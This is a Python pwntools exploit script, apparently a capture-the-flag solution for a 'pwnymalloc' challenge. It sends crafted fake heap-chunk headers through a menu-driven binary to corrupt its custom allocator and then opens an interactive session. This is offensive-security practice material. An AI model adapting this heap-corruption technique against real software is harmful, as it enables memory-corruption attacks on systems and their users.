#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1AFC
        brva 0x1AC5
        brva 0x1A8D 
        c
        ''')
        input()


if args.REMOTE:
    p = remote('pwnymalloc.chal.uiuc.tf', 1337, ssl=True)
else:
    p = process(exe.path)
GDB()

def op3(num, pa):
    sla(b'>', b'3')
    sla(b'refunded:', str(num))
    sa(b'request:', pa)
def op1(pa):
    sla(b'>', b'1')
    sla(b'complaint:', pa)
# for i in range(8):
#     op3(100, str(1)*126)
pa = flat(0, 0x80).ljust(120, b'\0') + p64(0x00000000000000)[:-1]
op3(100, pa)
pa = flat(0, 0x80).ljust(120, b'\0') + p64(0x00000000000108)[:-1]
op3(100, pa)
# op3(100, b'1'*120 + p32(0x10)[:-1])
op1(b'a'*70)
pa = p64(0x1)*15 + p64(0x00000000000108)[:-1]
op3(100, pa)
sla(b'>', b'4')
sl(b'1')
p.interactive()
